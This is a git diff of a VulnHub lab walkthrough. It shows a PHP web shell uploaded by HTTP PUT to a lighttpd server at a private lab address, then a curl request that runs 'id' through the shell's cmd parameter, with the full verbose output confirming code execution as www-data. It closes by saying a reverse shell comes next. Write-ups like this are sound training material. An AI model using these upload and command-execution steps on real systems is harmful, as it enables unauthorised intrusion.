@@ -117,9 +117,29 @@ root@kali: curl 192.168.127.230/test/ -X PUT -T ./shell.php -v
  ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1eea3aca-eb29-4136-a03f-c8fafd9bf618)
 
 
-now le
+now let's try if we can run a command :
 
+```bash
+root@kali: curl 192.168.127.230/test/shell.php?cmd=id -v
 
+*   Trying 192.168.127.230:80...
+* Connected to 192.168.127.230 (192.168.127.230) port 80
+> GET /test/shell.php?cmd=id HTTP/1.1
+> Host: 192.168.127.230
+> User-Agent: curl/8.3.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< X-Powered-By: PHP/5.3.10-1ubuntu3.21
+< Content-type: text/html
+< Transfer-Encoding: chunked
+< Date: Wed, 25 Oct 2023 17:13:37 GMT
+< Server: lighttpd/1.4.28
+< 
+uid=33(www-data) gid=33(www-data) groups=33(www-data) <-----------
+* Connection #0 to host 192.168.127.230 left intact
+```
+yes we can run our command, now it's time for reverse shell.
 
 
 
